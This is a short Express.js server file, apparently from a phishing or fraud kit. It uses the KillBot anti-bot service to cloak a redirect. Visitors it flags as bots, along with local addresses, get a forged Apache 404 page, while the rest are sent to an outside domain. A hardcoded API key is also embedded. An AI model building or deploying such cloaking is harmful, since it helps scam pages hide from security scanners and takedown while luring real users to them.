// index.js (CommonJS)
const express = require('express');
const KillBot = require('killbot.to');

const app = express();
const PORT = process.env.PORT || 3000;

const apiKey = '225e7b97-524c-45d6-800c-aa7e3831a1ab';
const config = 'default';
const killBot = new KillBot(apiKey, config);

const fake404 = `
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head><title>404 Not Found</title></head>
<body>
  <h1>Not Found</h1>
  <p>The requested URL was not found on this server.</p>
  <hr>
  <address>Apache/2.4.57 (Debian) Server</address>
</body></html>
`;

function isLocalIp(ip) {
  // Filtre basique (127.x, 10.x, 192.168.x, etc.)
  if (!ip) return true;
  return (
    ip.startsWith('127.') ||
    ip.startsWith('10.') ||
    ip.startsWith('192.168.') ||
    ip.startsWith('::1') ||
    ip === '0.0.0.0'
  );
}

// On applique KillBot uniquement sur la route '/'
app.get('/', (req, res) => {
  // Récupération IP (X-Forwarded-For) + fallback
  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '';
  if (ip.includes(',')) {
    ip = ip.split(',')[0].trim();
  }

  // Si l’IP est locale => renvoie direct le faux 404
  if (isLocalIp(ip)) {
    console.log('Local IP => renvoie 404');
    return res.status(404).send(fake404);
  }

  // Sinon, TENTATIVE KillBot
  killBot.check({ ip, ua: req.headers['user-agent'] || 'Unknown-UA' })
    .then(result => {
      if (result.block) {
        // Bloqué => 404
        return res.status(404).send(fake404);
      } else {
        // Autorisé => redirection
        return res.redirect('https://maurpie.com');
      }
    })
    .catch(err => {
      // Erreur KillBot => renvoie 404
      console.error('KillBot error:', err);
      return res.status(404).send(fake404);
    });
});

// Pour TOUTES les autres routes => simple 404
app.all('*', (req, res) => {
  return res.status(404).send(fake404);
});

app.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});